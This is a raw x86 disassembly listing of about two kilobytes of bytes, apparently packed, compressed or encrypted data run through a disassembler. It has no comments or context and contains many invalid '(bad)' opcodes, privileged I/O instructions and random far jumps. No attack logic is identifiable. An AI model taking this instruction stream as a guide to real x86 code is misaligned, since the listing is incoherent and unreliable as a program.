  410443:	jns    0x4103ff
  410445:	cmp    esi,edi
  410447:	and    eax,0x22d5a94c
  41044c:	sbb    BYTE PTR [edi+0x3a],dh
  41044f:	dec    ecx
  410450:	pop    eax
  410451:	dec    ecx
  410452:	outs   dx,DWORD PTR ds:[esi]
  410453:	inc    ecx
  410454:	call   0xfc1b:0xbee52292
  41045b:	std    
  41045c:	mov    fs,esi
  41045e:	ds in  eax,dx
  410460:	fwait
  410461:	in     al,0x3b
  410463:	sbb    al,0x9
  410465:	fwait
  410466:	xor    eax,0xad0df6f4
  41046b:	fmul   QWORD PTR [edi]
  41046d:	test   dl,0xf8
  410470:	pop    esp
  410471:	xchg   esp,eax
  410472:	loope  0x4103fa
  410474:	leave  
  410475:	fcom   st(0)
  410477:	mov    ah,0x9
  410479:	push   ebp
  41047a:	fcom   st(6)
  41047c:	jecxz  0x4104be
  41047e:	and    edi,DWORD PTR [ebx]
  410480:	jmp    0x42a6:0x5f8f6b69
  410487:	sbb    BYTE PTR [eax],cl
  410489:	lea    ebp,[ecx-0x3fc058f0]
  41048f:	mov    ch,0x22
  410491:	inc    ebx
  410492:	call   FWORD PTR ds:0xfdd826c3
  410498:	ja     0x41041c
  41049a:	je     0x410428
  41049c:	pop    edx
  41049d:	lea    ebp,[esi]
  41049f:	mov    eax,0x6e5690c1
  4104a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104a6:	push   ds
  4104a7:	pop    eax
  4104a8:	add    DWORD PTR [edi-0x257310ea],ecx
  4104ae:	mov    ds:0xdf7d19a1,eax
  4104b3:	or     al,BYTE PTR [edx]
  4104b5:	imul   edi,ebx,0xbd2b5d58
  4104bb:	scas   al,BYTE PTR es:[edi]
  4104bc:	lahf   
  4104bd:	cdq    
  4104be:	pusha  
  4104bf:	push   0xfffffff2
  4104c1:	xchg   DWORD PTR [ebx+0x9],ecx
  4104c4:	xor    ah,BYTE PTR [edx+eax*4]
  4104c7:	mov    dl,0x8d
  4104c9:	ret    
  4104ca:	and    bl,BYTE PTR [ecx+0x77dce1af]
  4104d0:	inc    esi
  4104d1:	inc    ebp
  4104d2:	into   
  4104d3:	add    bl,BYTE PTR [edx+0x2db3a610]
  4104d9:	mov    ecx,0x523a8470
  4104de:	in     eax,0xa
  4104e0:	or     cl,bl
  4104e2:	enter  0xd330,0x6
  4104e6:	ins    BYTE PTR es:[edi],dx
  4104e7:	jbe    0x410518
  4104e9:	jb     0x4104c4
  4104eb:	sbb    dh,BYTE PTR [ebx+0xecc7660]
  4104f1:	ss xchg ebp,eax
  4104f3:	fst    DWORD PTR fs:[ecx]
  4104f6:	mov    al,0x97
  4104f8:	popa   
  4104f9:	sti    
  4104fa:	jae    0x4104f8
  4104fc:	lock add eax,0x83b0f928
  410502:	jg     0x4104df
  410504:	inc    eax
  410505:	xchg   esp,eax
  410506:	std    
  410507:	outs   dx,BYTE PTR ds:[esi]
  410508:	mov    ch,bh
  41050a:	sub    eax,0x5eb76a38
  41050f:	fisttp QWORD PTR [ecx+0x4c8564a3]
  410515:	shl    DWORD PTR [eax-0x1],1
  410518:	jns    0x410568
  41051a:	ret    
  41051b:	dec    ebx
  41051c:	jl     0x410578
  41051e:	mov    gs,esp
  410520:	inc    edx
  410521:	(bad)  
  410522:	call   0x45946c4d
  410527:	je     0x410540
  410529:	imul   ecx,DWORD PTR [edi],0xffffffd3
  41052c:	aad    0xf7
  41052e:	aas    
  41052f:	daa    
  410530:	inc    edi
  410531:	jmp    0x8fb4f1fb
  410536:	inc    edi
  410537:	aam    0xcd
  410539:	dec    esi
  41053a:	push   ss
  41053b:	pop    ax
  41053d:	sub    edx,DWORD PTR [ebx-0x7d89256a]
  410543:	jb     0x410546
  410545:	test   al,0xcc
  410547:	sbb    ebp,DWORD PTR [eax+0x16]
  41054a:	cld    
  41054b:	scas   eax,DWORD PTR es:[edi]
  41054c:	daa    
  41054d:	popa   
  41054e:	out    dx,al
  41054f:	push   cs
  410550:	add    BYTE PTR [eax],bh
  410552:	jno    0x410545
  410554:	mov    ch,0xc8
  410556:	push   0x34702e44
  41055b:	mov    ch,0x91
  41055d:	into   
  41055e:	(bad)  
  41055f:	or     ch,BYTE PTR [ebx]
  410561:	enter  0x7a92,0x98
  410565:	mov    edx,0x6b9c34d9
  41056a:	aad    0xfb
  41056c:	jbe    0x4105e1
  41056e:	push   ss
  41056f:	pop    ecx
  410570:	imul   ebx,DWORD PTR [edi-0x4ed3105b],0xffffffbf
  410577:	(bad)  
  410578:	fadd   DWORD PTR [ebx-0x52]
  41057b:	idiv   DWORD PTR [esi+0x2ace3cc3]
  410581:	pop    es
  410582:	jle    0x410586
  410584:	shl    BYTE PTR [ebx],0xc9
  410587:	dec    eax
  410588:	inc    BYTE PTR [edi+eax*1-0x63]
  41058c:	xor    al,dh
  41058e:	in     eax,0xb6
  410590:	out    0xde,al
  410592:	retf   0xfbfc
  410595:	(bad)  
  410597:	loopne 0x410561
  410599:	fwait
  41059a:	cmp    al,0x71
  41059c:	fcom   DWORD PTR [esi+ebx*1+0x1f]
  4105a0:	sub    BYTE PTR [esi-0x13],0xcb
  4105a4:	cmp    bh,ch
  4105a6:	mov    BYTE PTR [eax],al
  4105a8:	mov    eax,ds:0x973ab888
  4105ad:	xchg   esp,eax
  4105ae:	sub    bl,al
  4105b0:	jmp    0x4df0:0xb7f94f6e
  4105b7:	inc    edx
  4105b8:	push   0x657474d5
  4105bd:	je     0x410579
  4105bf:	xor    al,0xb8
  4105c1:	in     eax,0xc9
  4105c3:	inc    esi
  4105c4:	out    0x86,eax
  4105c6:	jge    0x410553
  4105c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105c9:	pop    ds
  4105ca:	and    esp,ecx
  4105cc:	cmp    DWORD PTR [esi-0x52],edi
  4105cf:	sub    bh,BYTE PTR [ebp-0x20a326df]
  4105d5:	xor    esi,eax
  4105d7:	inc    esi
  4105d8:	mov    ?,ecx
  4105da:	cmp    DWORD PTR [ebp+0x42],ebp
  4105dd:	fistp  DWORD PTR [ecx+edi*8]
  4105e0:	mov    ebp,0xb804445d
  4105e5:	(bad)  
  4105e6:	jo     0x4105e8
  4105e8:	push   eax
  4105e9:	aam    0xd8
  4105eb:	push   esi
  4105ec:	adc    ecx,edi
  4105ee:	add    BYTE PTR cs:[eax],ah
  4105f1:	mov    ah,0xe
  4105f3:	sti    
  4105f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105f5:	jmp    0xed3adf09
  4105fa:	inc    ebp
  4105fb:	out    dx,al
  4105fc:	sbb    ecx,esp
  4105fe:	dec    BYTE PTR [edi+ebp*4-0x44]
  410602:	fist   WORD PTR [esp+edi*1]
  410605:	sub    al,ch
  410607:	sahf   
  410608:	aam    0x49
  41060a:	jae    0x410643
  41060c:	scas   al,BYTE PTR es:[edi]
  41060d:	jo     0x410604
  41060f:	test   dl,bh
  410611:	cld    
  410612:	bnd jg 0x4105e0
  410615:	leave  
  410616:	bnd jbe 0x4105f9
  410619:	cmp    eax,0xc76ab01f
  41061e:	jno    0x4105e3
  410620:	cli    
  410621:	or     DWORD PTR [edi],0x6732b906
  410627:	ficomp DWORD PTR ss:[edi-0x7fe1f347]
  41062e:	jbe    0x41066f
  410630:	jl     0x41066e
  410632:	das    
  410633:	call   0x9a05:0xe927c36e
  41063a:	mov    ebp,0x624f967b
  41063f:	inc    esp
  410640:	stos   DWORD PTR es:[edi],eax
  410641:	loop   0x410691
  410643:	and    al,0x37
  410645:	mov    esp,0x88a24f36
  41064a:	loop   0x410675
  41064c:	pop    es
  41064d:	mov    ecx,ecx
  41064f:	(bad)  
  410650:	push   esi
  410651:	jecxz  0x4106c7
  410653:	dec    ecx
  410654:	pop    edi
  410655:	es cdq 
  410657:	push   0xffffffdc
  410659:	repnz push ebp
  41065b:	fmul   QWORD PTR [ebp+0x2a]
  41065e:	out    dx,eax
  41065f:	inc    esi
  410660:	xor    DWORD PTR ss:[esi+0x12],edi
  410664:	pop    es
  410665:	ja     0x4106d5
  410667:	(bad)  
  410668:	pop    ecx
  410669:	clc    
  41066a:	add    DWORD PTR [eax+eax*1-0x2b],edx
  41066e:	out    0x49,al
  410670:	add    BYTE PTR [edi],cl
  410672:	fisttp QWORD PTR [ebp+0xa04ef0f]
  410678:	shl    BYTE PTR [eax],0x5b
  41067b:	into   
  41067c:	inc    edx
  41067d:	in     al,0x94
  41067f:	adc    BYTE PTR [edx+eiz*4-0x12de79ab],0x16
  410687:	mov    esi,0xc70ee154
  41068c:	jmp    0x8f5370ae
  410691:	cli    
  410692:	out    0xae,al
  410694:	push   edx
  410695:	gs mov esi,0xa44a7d1f
  41069b:	mov    WORD PTR [edi],fs
  41069d:	mov    esp,0xb929d132
  4106a2:	mul    eax
  4106a4:	es pop edi
  4106a6:	add    DWORD PTR [eax-0x2e4c8021],esp
  4106ac:	or     dh,BYTE PTR [ecx]
  4106ae:	mov    cl,0x70
  4106b0:	mov    ebx,0x7e8de4b1
  4106b5:	xchg   edx,eax
  4106b6:	xchg   esi,eax
  4106b7:	push   ebp
  4106b8:	xchg   BYTE PTR [ecx],bl
  4106ba:	inc    esi
  4106bb:	sub    eax,0x7858d3be
  4106c0:	jge    0x4106ba
  4106c2:	neg    DWORD PTR [edi*2+0x77f9e7b4]
  4106c9:	sbb    DWORD PTR [eax-0x51ce87ea],esp
  4106cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106d0:	push   ds
  4106d1:	in     al,dx
  4106d2:	and    DWORD PTR [eax-0x45434199],ebx
  4106d8:	imul   ebp,DWORD PTR [ebx+0x5d367638],0x9c789c59
  4106e2:	mov    dl,0x21
  4106e4:	sti    
  4106e5:	hlt    
  4106e6:	stos   BYTE PTR es:[edi],al
  4106e7:	retf   0x9afe
  4106ea:	xchg   ebp,eax
  4106eb:	mov    bh,BYTE PTR [edi+esi*8+0x22]
  4106ef:	mov    bh,0x5f
  4106f1:	gs test al,0xb5
  4106f4:	inc    esp
  4106f5:	push   ds
  4106f6:	out    dx,al
  4106f7:	xor    ah,BYTE PTR ds:0xaee645e9
  4106fd:	dec    eax
  4106fe:	adc    ecx,DWORD PTR [edi]
  410700:	clc    
  410701:	dec    ecx
  410702:	ins    DWORD PTR es:[edi],dx
  410703:	mov    al,ds:0x3e3f84f0
  410708:	les    esp,FWORD PTR [ebx+0x4e63a2cd]
  41070e:	aaa    
  41070f:	jle    0x41078c
  410711:	inc    eax
  410712:	xor    al,BYTE PTR [edi-0xe601f58]
  410718:	mov    BYTE PTR [ecx],cl
  41071a:	lds    edx,FWORD PTR [edx]
  41071c:	inc    esi
  41071d:	mov    ds:0xd2ff057f,al
  410722:	icebp  
  410723:	fimul  WORD PTR [ebp+0xc]
  410726:	pushf  
  410727:	adc    ch,BYTE PTR [edx-0x3e7e98b9]
  41072d:	test   DWORD PTR [esi*4-0x17305c8],edx
  410734:	push   esi
  410735:	nop
  410736:	push   es
  410737:	add    eax,0x7e48cb8a
  41073c:	rcl    eax,0xca
  41073f:	mov    WORD PTR [edi+0x1678ebb9],fs
  410745:	test   DWORD PTR [ecx+0xd05bd39],0x1d7eedec
  41074f:	mov    ?,WORD PTR [edx+0x61]
  410752:	fstp   DWORD PTR [esi+0x16]
  410755:	mov    edx,0x4c17c530
  41075a:	hlt    
  41075b:	adc    BYTE PTR [edx+0x7c],bl
  41075e:	jae    0x4107da
  410760:	add    al,0xae
  410762:	repz (bad) 
  410764:	lods   al,BYTE PTR ds:[esi]
  410765:	xor    eax,DWORD PTR [esi-0x1f]
  410768:	pop    esi
  410769:	jnp    0x410775
  41076b:	ret    0x5286
  41076e:	jp     0x41073c
  410770:	das    
  410771:	add    ebx,eax
  410773:	xchg   ecx,eax
  410774:	jnp    0x410761
  410776:	and    ebx,ebp
  410778:	add    al,0x83
  41077a:	test   eax,0xa36e7b8b
  41077f:	in     eax,dx
  410780:	fdivr  QWORD PTR [eax-0x7a]
  410783:	cmp    BYTE PTR [eax+0x303c81df],bh
  410789:	shr    BYTE PTR [edi],1
  41078b:	out    0xdf,al
  41078d:	xor    eax,0xf52578a4
  410792:	(bad)  
  410793:	test   al,0x90
  410795:	and    al,0xa3
  410797:	or     ebp,DWORD PTR [esi-0x12079242]
  41079d:	xor    BYTE PTR gs:[ebx+edx*8-0x692244b0],dh
  4107a5:	cmc    
  4107a6:	xchg   ebx,eax
  4107a7:	pop    esp
  4107a8:	jno    0x41072e
  4107aa:	sbb    al,BYTE PTR [edi-0x2c517395]
  4107b0:	int    0xf6
  4107b2:	enter  0xd463,0x6f
  4107b6:	outs   dx,BYTE PTR ds:[esi]
  4107b7:	xlat   BYTE PTR ds:[ebx]
  4107b8:	pop    eax
  4107b9:	sbb    al,0x81
  4107bb:	inc    DWORD PTR [esi-0x2d823887]
  4107c1:	jmp    0x41078e
  4107c3:	inc    edi
  4107c4:	adc    DWORD PTR [edi-0x38],ebx
  4107c7:	cli    
  4107c8:	dec    esi
  4107c9:	or     BYTE PTR [ecx+0x22],al
  4107cc:	into   
  4107cd:	mov    al,0xe6
  4107cf:	pop    esp
  4107d0:	jnp    0x41076d
  4107d2:	cmp    eax,0x3dfb0ad2
  4107d7:	ror    DWORD PTR [ebx-0x2be87ddb],1
  4107dd:	and    BYTE PTR [edi],cl
  4107df:	adc    ebp,DWORD PTR [edx-0xf15af83]
  4107e5:	enter  0x6efb,0xc
  4107e9:	and    al,0x3
  4107eb:	outs   dx,BYTE PTR ds:[esi]
  4107ec:	cmp    ecx,esp
  4107ee:	add    al,0x68
  4107f0:	imul   ecx,DWORD PTR [ebx-0x10],0xdbd5d211
  4107f7:	fsub   DWORD PTR [ecx-0x78]
  4107fa:	loopne 0x410867
  4107fc:	xor    al,0xbf
  4107fe:	pop    ebx
  4107ff:	pop    ebx
  410800:	mov    ds:0x3f1b1446,eax
  410805:	mov    DWORD PTR [eax-0x64],edi
  410808:	sub    ch,ah
  41080a:	cmp    al,0xac
  41080c:	mov    ch,0x6
  41080e:	imul   esp,DWORD PTR [ebp-0x670b6a2b],0x268241cb
  410818:	sub    al,0x2d
  41081a:	inc    ebp
  41081b:	cld    
  41081c:	xor    DWORD PTR [esi-0x33],edi
  41081f:	xchg   DWORD PTR [ebx],esi
  410821:	imul   edx,DWORD PTR [edi-0x305097cd],0x85fa7e1b
  41082b:	icebp  
  41082c:	cmp    eax,0x998643fe
  410831:	dec    ecx
  410832:	enter  0x83f4,0xbf
  410836:	cli    
  410837:	adc    eax,0xc851a0d3
  41083c:	cdq    
  41083d:	xchg   esp,eax
  41083e:	push   esi
  41083f:	sub    al,0x72
  410841:	std    
  410842:	push   0x16
  410844:	xchg   DWORD PTR [esi],ecx
  410846:	ret    
  410847:	xchg   esp,eax
  410848:	rcr    BYTE PTR [eax-0x47],cl
  41084b:	in     eax,dx
  41084c:	push   ebp
  41084d:	add    DWORD PTR [esi],ebp
  41084f:	fsub   st,st(0)
  410851:	add    edx,DWORD PTR [edi]
  410853:	ret    0x7d77
  410856:	and    edx,esp
  410858:	(bad)  
  41085a:	aam    0xaf
  41085c:	daa    
  41085d:	cs in  eax,dx
  41085f:	jmp    0xc604542
  410864:	jo     0x4108b5
  410866:	add    ebp,DWORD PTR ds:0x5b9bd70f
  41086c:	cld    
  41086d:	pop    ebx
  41086e:	and    al,0x28
  410870:	jmp    0x136313f
  410875:	in     eax,dx
  410876:	das    
  410877:	fisubr WORD PTR ds:0xdd18460c
  41087d:	xor    edx,DWORD PTR [eax]
  41087f:	leave  
  410880:	dec    edx
  410881:	shl    BYTE PTR [eax],1
  410883:	(bad)  [eax-0x2c]
  410886:	das    
  410887:	nop
  410888:	imul   eax,DWORD PTR [edi],0x69
  41088b:	out    dx,eax
  41088c:	jns    0x410850
  41088e:	xor    al,0x96
  410890:	lods   eax,DWORD PTR ds:[esi]
  410891:	sahf   
  410892:	lds    edx,FWORD PTR [ecx]
  410894:	inc    esp
  410895:	call   0xfb3ab299
  41089a:	fsubr  DWORD PTR [edx-0xb]
  41089d:	or     esp,DWORD PTR [esi-0x1]
  4108a0:	adc    esp,esp
  4108a2:	mov    ah,0xea
  4108a4:	fwait
  4108a5:	sub    al,0x26
  4108a7:	sbb    DWORD PTR [esi+0x79],esp
  4108aa:	mov    esp,0xfe833fe1
  4108af:	mov    dl,0xa2
  4108b1:	shr    ecx,1
  4108b3:	aad    0x2d
  4108b5:	pop    esp
  4108b6:	not    BYTE PTR [eax]
  4108b8:	test   al,0x6a
  4108ba:	js     0x410893
  4108bc:	mov    ds:0xebd6bb8a,al
  4108c1:	push   cs
  4108c2:	(bad)  
  4108c3:	pop    ebp
  4108c4:	shl    DWORD PTR [esi],0xdc
  4108c7:	ret    0x5edc
  4108ca:	dec    ebx
  4108cb:	cmp    ebx,ebp
  4108cd:	scas   al,BYTE PTR es:[edi]
  4108ce:	mov    esp,DWORD PTR ds:0x78837b8d
  4108d4:	mov    bl,0xb2
  4108d6:	push   esp
  4108d7:	(bad)  
  4108d8:	cmp    edx,esp
  4108da:	icebp  
  4108db:	jp     0x4108ed
  4108dd:	xchg   ebp,eax
  4108de:	bound  edi,QWORD PTR ds:0x5da43e92
  4108e4:	cmp    DWORD PTR [edx],0x6dc70456
  4108ea:	mov    edi,0x55eb0a94
  4108ef:	and    DWORD PTR [edi],edi
  4108f1:	loope  0x410882
  4108f3:	push   esp
  4108f4:	xor    dl,BYTE PTR [edi-0x7052faca]
  4108fa:	xor    ebp,DWORD PTR [eax]
  4108fc:	cmp    ch,BYTE PTR [ebx-0x49]
  4108ff:	repnz pushf 
  410901:	movhlps xmm7,xmm4
  410904:	add    al,0xcc
  410906:	xchg   esi,eax
  410907:	and    BYTE PTR [eax-0x6c5a113a],al
  41090d:	out    0x8a,eax
  41090f:	out    0x87,eax
  410911:	ret    0x8e8b
  410914:	mov    gs,WORD PTR [edi+0x119c608c]
  41091a:	push   edi
  41091b:	pop    esi
  41091c:	aas    
  41091d:	inc    ebp
  41091e:	jg     0x4108a6
  410920:	sub    eax,0x367f45a2
  410925:	jmp    0x700ea1d4
  41092a:	cmp    bh,BYTE PTR [esi+0xf]
  41092d:	rol    dl,1
  41092f:	repz mov ds:0x3cd6ed35,al
  410935:	push   di
  410937:	mov    esp,0x17ff6253
  41093c:	outs   dx,DWORD PTR ds:[esi]
  41093d:	test   DWORD PTR [esi-0x31],edx
  410940:	test   eax,0xfc7a09cc
  410945:	out    dx,eax
  410946:	jmp    0x59388a51
  41094b:	xor    al,0x84
  41094d:	xor    DWORD PTR [edi],0xf
  410950:	cld    
  410951:	jo     0x410901
  410953:	inc    ebp
  410954:	jns    0x41099d
  410956:	dec    eax
  410957:	ficom  WORD PTR [eax+0x6d]
  41095a:	sbb    BYTE PTR [ebx],dl
  41095c:	or     al,0xf7
  41095e:	test   eax,0x50f01f9e
  410963:	add    bl,BYTE PTR [edx]
  410965:	cmp    BYTE PTR [eax],ch
  410967:	mov    DWORD PTR [edi],0x90592206
  41096d:	and    ebp,ebp
  41096f:	adc    eax,0x2acc7036
  410974:	xor    al,0x25
  410976:	mov    esp,0x12185c05
  41097b:	aad    0x7f
  41097d:	dec    DWORD PTR [ecx]
  41097f:	cwde   
  410980:	stc    
  410981:	loopne 0x410951
  410983:	mov    cl,0xce
  410985:	jns    0x41094b
  410987:	repnz in eax,0xfe
  41098a:	mov    edi,ss
  41098c:	adc    al,0x8a
  41098e:	lods   al,BYTE PTR ds:[esi]
  41098f:	mov    dl,BYTE PTR [edx+ecx*4-0x448fc501]
  410996:	je     0x41095e
  410998:	repnz mov eax,ds:0x32863907
  41099e:	scas   eax,DWORD PTR es:[edi]
  41099f:	stc    
  4109a0:	cwde   
  4109a1:	pusha  
  4109a2:	dec    ebp
  4109a3:	pop    es
  4109a4:	and    ah,BYTE PTR [ebp+0x64]
  4109a7:	and    eax,0x34dcb819
  4109ac:	daa    
  4109ad:	pop    esi
  4109ae:	jb     0x410935
  4109b0:	mov    ds:0x82b8ba1b,eax
  4109b5:	(bad)  
  4109b6:	scas   al,BYTE PTR es:[edi]
  4109b7:	push   0xf9d5fa1b
  4109bc:	int    0xfe
  4109be:	imul   ebp,DWORD PTR ds:0x1b42cf4,0xffffffc0
  4109c5:	pop    es
  4109c6:	cmp    dl,bl
  4109c8:	xor    BYTE PTR [ecx-0x4eaeafab],dl
  4109ce:	jl     0x410981
  4109d0:	test   eax,0x21cac196
  4109d5:	xchg   DWORD PTR [ecx+ecx*2],esp
  4109d8:	inc    edi
  4109d9:	dec    ebp
  4109da:	mov    ecx,0xc4829764
  4109df:	mov    cl,0x1b
  4109e1:	pushaw 
  4109e3:	pushf  
  4109e4:	xchg   esp,eax
  4109e5:	sti    
  4109e6:	aad    0x2e
  4109e8:	js     0x4109f0
  4109ea:	hlt    
  4109eb:	xchg   esi,eax
  4109ec:	xor    BYTE PTR [ebx-0x15b981ec],dl
  4109f2:	xchg   DWORD PTR [eax-0x167d6051],ebp
  4109f8:	adc    dl,BYTE PTR [ebx+0x70]
  4109fb:	rcl    DWORD PTR [esi+0x47dddc4],1
  410a01:	mov    cl,0x8e
  410a03:	push   eax
  410a04:	and    eax,edx
  410a06:	sahf   
  410a07:	in     al,dx
  410a08:	test   al,0xe3
  410a0a:	sub    dl,BYTE PTR [ebp+0x6]
  410a0d:	xchg   edx,eax
  410a0e:	xchg   edx,eax
  410a0f:	push   ebp
  410a10:	push   0xe01ba755
  410a15:	mov    ebp,0x6463114f
  410a1a:	dec    ebx
  410a1b:	test   al,0xb5
  410a1d:	push   es
  410a1e:	adc    al,0xf0
  410a20:	xor    BYTE PTR [ebx],al
  410a22:	mov    ds:0x213dde52,eax
  410a27:	aas    
  410a28:	push   0x8
  410a2a:	mov    eax,0xbef88484
  410a2f:	jae    0x4109bf
  410a31:	push   ecx
  410a32:	dec    esp
  410a33:	adc    eax,0x25a143cd
  410a38:	xor    esi,DWORD PTR [ebx-0x44da39f2]
  410a3e:	ins    BYTE PTR es:[edi],dx
  410a3f:	jae    0x4109ee
  410a41:	cmp    al,0x9b
  410a43:	(bad)  
  410a44:	adc    DWORD PTR [ecx+edx*1-0x2b960ee0],eax
  410a4b:	sbb    dl,cl
  410a4d:	jb     0x410aaa
  410a4f:	mov    eax,0xb2fe4887
  410a54:	mov    edx,DWORD PTR ds:0xfae3212c
  410a5a:	cmc    
  410a5b:	jg     0x4109f9
  410a5d:	jbe    0x410a23
  410a5f:	add    eax,0xb8ca8072
  410a64:	and    al,0xb3
  410a66:	std    
  410a67:	cmp    al,0x95
  410a69:	stos   BYTE PTR es:[edi],al
  410a6a:	xchg   esp,eax
  410a6b:	daa    
  410a6c:	iret   
  410a6d:	icebp  
  410a6e:	mov    ebx,0xe2ee4732
  410a73:	outs   dx,BYTE PTR ds:[esi]
  410a74:	mov    eax,eax
  410a76:	push   0x7e983355
  410a7b:	xchg   edi,eax
  410a7c:	mov    dl,0xa3
  410a7e:	xchg   edi,esp
  410a80:	push   ecx
  410a81:	jge    0x410ab2
  410a83:	cwde   
  410a84:	mov    eax,ds:0xd663b030
  410a89:	mov    ah,0x65
  410a8b:	test   DWORD PTR [ebp+0x3b16f816],eax
  410a91:	add    edi,DWORD PTR [edx+esi*8+0x0]
  410a95:	clc    
  410a96:	cld    
  410a97:	mov    WORD PTR [ebp+eiz*8+0x35],cs
  410a9b:	sahf   
  410a9c:	lahf   
  410a9d:	push   0xc83fbcc
  410aa2:	xor    BYTE PTR [eax+edx*1],bl
  410aa5:	add    bh,BYTE PTR [edx]
  410aa7:	push   0xffffffb2
  410aa9:	je     0x410a32
  410aab:	cmp    DWORD PTR [eax+0x13],esi
  410aae:	loop   0x410aa6
  410ab0:	sbb    edx,ebx
  410ab2:	pop    ebx
  410ab3:	aam    0xe0
  410ab5:	sbb    ebp,edx
  410ab7:	add    edx,DWORD PTR [eax-0x64]
  410aba:	push   eax
  410abb:	jp     0x410afd
  410abd:	outs   dx,BYTE PTR ds:[esi]
  410abe:	jmp    0xda49:0x1b0ab022
  410ac5:	inc    ebp
  410ac6:	adc    al,0x9b
  410ac8:	push   ss
  410ac9:	loopne 0x410b11
  410acb:	sbb    al,0x24
  410acd:	fmul   QWORD PTR [esi]
  410acf:	fistp  WORD PTR [esi+eax*4]
  410ad2:	sti    
  410ad3:	inc    edx
  410ad4:	adc    esp,DWORD PTR [esi+0x5d2e4e5b]
  410ada:	das    
  410adb:	jecxz  0x410a74
  410add:	mov    edi,ebp
  410adf:	cmp    al,0x9e
  410ae1:	or     ah,BYTE PTR [edi+0x30]
  410ae4:	mov    ebx,DWORD PTR ds:0x5fd68bfc
  410aea:	push   0x73
  410aec:	mov    ecx,ebx
  410aee:	fcom   QWORD PTR [edx+0x4a]
  410af1:	mov    ecx,eax
  410af3:	xlat   BYTE PTR ds:[ebx]
  410af4:	cmp    cl,ch
  410af6:	adc    DWORD PTR [edi+0x34],0x92acbf5d
  410afd:	and    bh,BYTE PTR [ebx]
  410aff:	fdivr  DWORD PTR [edi]
  410b01:	jne    0x410b51
  410b03:	cli    
  410b04:	pop    esi
  410b05:	in     al,0x9a
  410b07:	mov    cl,0x73
  410b09:	int    0x87
  410b0b:	rcl    BYTE PTR [eax+0x1dce3340],cl
  410b11:	sbb    DWORD PTR [esi-0x7f],edx
  410b14:	push   edi
  410b15:	loop   0x410b2f
  410b17:	mov    DWORD PTR [ebp+0x4f],ebx
  410b1a:	push   0xffffffa5
  410b1c:	mov    BYTE PTR [edx],0xb9
  410b1f:	leave  
  410b20:	aam    0x6b
  410b22:	sbb    DWORD PTR [ebx],esp
  410b24:	sbb    BYTE PTR ds:0x8cd11b0e,ah
  410b2a:	popa   
  410b2b:	adc    BYTE PTR [esi],cl
  410b2d:	dec    edi
  410b2e:	jmp    ecx
  410b30:	and    DWORD PTR [edi-0x36899dce],esp
  410b36:	(bad)  
  410b37:	(bad)  
  410b38:	xchg   ecx,eax
  410b39:	fisttp DWORD PTR [ebx+0x49]
  410b3c:	sub    DWORD PTR [edi],ebp
  410b3e:	adc    ecx,DWORD PTR [edx-0x5bb0d0dc]
  410b44:	jb     0x410b76
  410b46:	sar    DWORD PTR [ebp+0x22],1
  410b49:	aad    0xc9
  410b4b:	clc    
  410b4c:	call   0x3bef:0x374089f5
  410b53:	mov    bl,0xa6
  410b55:	mov    ?,WORD PTR [edx+0x6227db47]
  410b5b:	(bad)  
  410b5c:	jg     0x410baa
  410b5e:	cmp    dh,BYTE PTR [edi-0x3c1e23c7]
  410b64:	stos   DWORD PTR es:[edi],eax
  410b65:	inc    ecx
  410b66:	and    ah,BYTE PTR [eax+edx*1-0x4e683a3f]
  410b6d:	xor    dh,dh
  410b6f:	cmc    
  410b70:	test   al,0x35
  410b72:	es xor eax,ebp
  410b75:	xor    DWORD PTR [eax+edi*8+0x14197c96],edi
  410b7c:	fs pop ss
  410b7e:	mov    bh,0x46
  410b80:	pop    ss
  410b81:	adc    eax,0x91416c00
  410b86:	mov    ch,BYTE PTR [eax]
  410b88:	fld    TBYTE PTR [edi-0x4f1eebda]
  410b8e:	pop    ebp
  410b8f:	popa   
  410b90:	call   DWORD PTR [edi-0xd]
  410b93:	test   al,0xa6
  410b95:	nop
  410b96:	adc    eax,0x34b5c42a
  410b9b:	xchg   edi,eax
  410b9c:	int    0x69
  410b9e:	pop    ecx
  410b9f:	or     BYTE PTR [edi+esi*1+0x1773722a],cl
  410ba6:	xlat   BYTE PTR ds:[ebx]
  410ba7:	aam    0x6
  410ba9:	data16 jle 0x410b42
  410bac:	pop    es
  410bad:	pop    ss
  410bae:	cmp    ecx,DWORD PTR [ebx+esi*2-0x63e14929]
  410bb5:	popa   
  410bb6:	xchg   BYTE PTR [edx],ah
  410bb8:	cmp    al,0x2e
  410bba:	xchg   BYTE PTR [eax+0x65],cl
  410bbd:	rcl    ebx,1
  410bbf:	or     DWORD PTR [eax],ebp
  410bc1:	lahf   
  410bc2:	ficom  DWORD PTR [edi+0x6e]
  410bc5:	imul   edi,DWORD PTR [ebp+0x5ba48cea],0xbd05d206
  410bcf:	sbb    BYTE PTR [eax+0x35],bh
  410bd2:	in     al,0xda
  410bd4:	xor    dh,BYTE PTR ds:0x3e1fcb66
  410bda:	jno    0x410bfe
  410bdc:	cli    
  410bdd:	dec    ebx
  410bde:	adc    BYTE PTR [ebp+0x123d1ce6],dh
  410be4:	not    eax
  410be6:	cmp    al,0x42
  410be8:	dec    eax
  410be9:	push   esp
  410bea:	or     eax,0xc2fb7f7a
  410bef:	gs jb  0x410c1c
  410bf2:	jbe    0x410c42
  410bf4:	sub    BYTE PTR [edi],cl
  410bf6:	test   BYTE PTR [esi],0x53
  410bf9:	ins    DWORD PTR es:[edi],dx
  410bfa:	out    0x59,al
  410bfc:	jne    0x410c41
  410bfe:	fidiv  WORD PTR [ebx]
  410c00:	(bad)  
  410c01:	call   0x9b27:0x46405a51
  410c08:	int3   
  410c09:	ret    
  410c0a:	(bad)  
  410c0b:	pop    eax
  410c0c:	imul   edi,DWORD PTR [ebx-0x69],0x1b
  410c10:	pusha  
  410c11:	add    DWORD PTR ds:0xd9c2fce2,ecx
  410c17:	mov    es,WORD PTR [ecx+0x1e]
  410c1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c1b:	dec    eax
  410c1c:	or     BYTE PTR [eax+eiz*8],dl
  410c1f:	inc    ebp
  410c20:	add    al,0xdc
  410c22:	fwait
  410c23:	enter  0x1841,0xd2
  410c27:	pop    edi
  410c28:	mov    es:0x215e567,eax
  410c2e:	arpl   WORD PTR [ebx],bp
  410c30:	sti    
  410c31:	std    
  410c32:	ficom  DWORD PTR [edx+0xfed3263]
